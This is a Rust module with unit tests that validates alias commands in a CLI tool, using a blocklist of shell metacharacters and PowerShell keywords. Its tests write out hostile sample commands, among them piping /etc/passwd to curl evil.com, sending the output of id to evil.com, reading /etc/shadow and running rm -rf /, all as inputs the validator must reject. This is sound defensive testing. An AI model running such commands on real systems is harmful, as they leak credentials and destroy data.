use anyhow::{ensure, Result};
use unicode_normalization::UnicodeNormalization;

/// Maximum alias command length
const MAX_COMMAND_LENGTH: usize = 500;

/// Shell metacharacters dangerous on ALL platforms.
/// Each entry is (pattern, reason) for clear error messages.
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    (";", "command separator"),
    ("|", "pipe operator"),
    ("&", "background/chaining operator"),
    ("`", "command substitution"),
    ("$(", "command substitution"),
    ("$", "variable expansion"),
    (">", "output redirection"),
    ("<", "input redirection"),
    ("(", "subshell"),
    (")", "subshell"),
    ("{", "brace expansion"),
    ("}", "brace expansion"),
    ("*", "wildcard"),
    ("?", "wildcard"),
    ("[", "glob range"),
    ("]", "glob range"),
    ("~", "home directory expansion"),
    ("!", "history expansion"),
    ("\n", "newline injection"),
    ("\r", "carriage return injection"),
];

/// Windows-specific dangerous patterns (CMD/PowerShell).
const WINDOWS_DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("%", "batch variable expansion"),
    ("^", "CMD escape character"),
];

/// Dangerous keywords that enable code execution.
const DANGEROUS_KEYWORDS: &[&str] = &["exec", "eval"];

/// PowerShell-specific dangerous keywords (case-insensitive check).
const POWERSHELL_DANGEROUS_KEYWORDS: &[&str] = &["invoke-expression", "iex", "downloadstring"];

/// Validates an alias command for security vulnerabilities.
///
/// This is the SINGLE SOURCE OF TRUTH for alias command validation.
/// All alias validation flows through this function.
///
/// Security checks applied:
/// 1. Unicode NFKC normalization (prevents homoglyph attacks)
/// 2. Empty/null byte/length checks
/// 3. Shell metacharacter blocklist (`;`, `|`, `&`, `$`, `` ` ``, etc.)
/// 4. Wildcard/glob patterns (`*`, `?`, `[`, `]`)
/// 5. Control character detection
/// 6. Quote blocking (prevents shell quoting attacks)
/// 7. Backslash blocking on Unix (prevents escape-based validation bypass)
/// 8. Dangerous keyword detection (`exec`, `eval`)
/// 9. On Windows: CMD/PowerShell-specific patterns (`%`, `^`, `IEX`, etc.)
///
/// # Examples
/// ```
/// # use msc::core::alias_validator::validate_alias_command;
/// assert!(validate_alias_command("ls -la").is_ok());
/// assert!(validate_alias_command("ls; rm -rf /").is_err());
/// ```
pub fn validate_alias_command(command: &str) -> Result<()> {
    // 1. Unicode NFKC normalization — converts homoglyphs to canonical form.
    //    Example: Greek Question Mark (U+037E) → ASCII semicolon (U+003B)
    let normalized: String = command.nfkc().collect();
    let trimmed = normalized.trim();

    // 2. Basic checks
    ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
    ensure!(
        !normalized.contains('\0'),
        "Alias command contains null byte"
    );
    ensure!(
        command.len() <= MAX_COMMAND_LENGTH,
        "Alias command is too long ({} characters, max {})",
        command.len(),
        MAX_COMMAND_LENGTH
    );

    // 3. Shell metacharacter blocklist (cross-platform)
    for &(pattern, reason) in DANGEROUS_PATTERNS {
        ensure!(
            !normalized.contains(pattern),
            "Alias command contains dangerous character '{}' — {}",
            pattern.escape_default(),
            reason
        );
    }

    // 4. Control characters (0x00-0x1F, 0x7F) — catches anything the explicit list misses
    for c in normalized.chars() {
        ensure!(
            !c.is_control(),
            "Alias command contains control character (U+{:04X})",
            c as u32
        );
    }

    // 5. Quotes — prevent shell quoting escapes
    ensure!(
        !normalized.contains('"') && !normalized.contains('\''),
        "Alias command contains quotes"
    );

    // 6. Dangerous keywords
    for keyword in DANGEROUS_KEYWORDS {
        ensure!(
            !normalized.contains(keyword),
            "Alias command contains '{}' keyword — potential code execution",
            keyword
        );
    }

    // 7. Backslash — escape sequences that could bypass validation.
    //    On Windows, backslash is the path separator so it must be allowed.
    #[cfg(not(target_os = "windows"))]
    ensure!(
        !normalized.contains('\\'),
        "Alias command contains dangerous character '\\' — potential validation bypass"
    );

    // 8. Windows-specific checks
    #[cfg(target_os = "windows")]
    validate_windows_extras(&normalized)?;

    Ok(())
}

/// Additional Windows-specific validation (CMD and PowerShell attack vectors).
#[cfg(target_os = "windows")]
fn validate_windows_extras(normalized: &str) -> Result<()> {
    for &(pattern, reason) in WINDOWS_DANGEROUS_PATTERNS {
        ensure!(
            !normalized.contains(pattern),
            "Alias command contains dangerous character '{}' — {}",
            pattern,
            reason
        );
    }

    let lower = normalized.to_lowercase();
    for keyword in POWERSHELL_DANGEROUS_KEYWORDS {
        ensure!(
            !lower.contains(keyword),
            "Alias command contains '{}' — PowerShell code execution risk",
            keyword
        );
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_safe_commands() {
        let safe_commands = vec![
            "ls -la",
            "git status",
            "cargo build --release",
            "python3 script.py",
            "npm run dev",
            "docker ps -a",
            "kubectl get pods",
            "node index.js",
        ];

        for cmd in safe_commands {
            assert!(
                validate_alias_command(cmd).is_ok(),
                "Should allow safe command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_command_injection() {
        let dangerous = vec![
            "ls; rm -rf /",
            "echo hello; curl evil.com",
            "cat /etc/passwd | curl evil.com",
            "sleep 1 &",
            "echo `hostname`",
            "echo $(whoami)",
            "curl evil.com?user=$(id)",
            "cat secret > /tmp/stolen",
            "cat < /etc/shadow",
            "(cd /tmp && malware)",
            "echo && malicious",
            "test || dangerous",
        ];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject dangerous command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_wildcards() {
        let wildcard_commands = vec!["rm -rf *", "cat *.txt", "ls [abc]", "echo test?"];

        for cmd in wildcard_commands {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject wildcard command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_keywords() {
        assert!(validate_alias_command("exec /bin/sh").is_err());
        assert!(validate_alias_command("eval code").is_err());
    }

    #[test]
    fn test_reject_quotes() {
        assert!(validate_alias_command(r#"echo "hello""#).is_err());
        assert!(validate_alias_command("echo 'hello'").is_err());
    }

    #[test]
    fn test_reject_control_characters() {
        assert!(validate_alias_command("cmd\x07bell").is_err());
        assert!(validate_alias_command("cmd\x1bescape").is_err());
    }

    #[test]
    fn test_reject_empty_and_long() {
        assert!(validate_alias_command("").is_err());
        assert!(validate_alias_command("   ").is_err());
        let long_cmd = "a".repeat(501);
        assert!(validate_alias_command(&long_cmd).is_err());
    }

    #[test]
    fn test_reject_null_byte() {
        assert!(validate_alias_command("cmd\0arg").is_err());
    }

    #[test]
    fn test_unicode_normalization_catches_homoglyphs() {
        // Greek Question Mark (U+037E) looks like semicolon but is a different codepoint.
        // NFKC normalization converts it to ASCII semicolon, which is then caught.
        let sneaky = "ls\u{037E} rm -rf /";
        assert!(
            validate_alias_command(sneaky).is_err(),
            "Should catch homoglyph semicolon via NFKC normalization"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_windows_specific_rejection() {
        assert!(validate_alias_command("echo %PATH%").is_err());
        assert!(validate_alias_command("dir ^& malicious").is_err());
        assert!(validate_alias_command("powershell -c IEX").is_err());
        assert!(validate_alias_command("cmd /c downloadstring").is_err());
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_unix_backslash_rejected() {
        assert!(validate_alias_command("echo \\n").is_err());
    }
}
